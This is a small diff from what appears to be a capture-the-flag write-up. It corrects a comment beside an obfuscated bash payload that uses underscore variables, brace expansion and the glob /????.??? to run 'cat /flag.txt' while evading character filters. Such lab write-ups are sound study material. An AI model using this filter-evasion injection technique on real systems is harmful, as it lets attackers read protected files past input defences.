@@ -62,7 +62,7 @@ To get the string /flag.txt we can use bash expansion such as /????.???
 
 Now just exeucute it 
 ```bash
-__=/????.???;$({${______}${_______}${________},$__}) # $(cat,/flag.txt)
+__=/????.???;$({${______}${_______}${________},$__}) # $({cat,/flag.txt})
 ```
 
 Run this commands in one line give us an error :
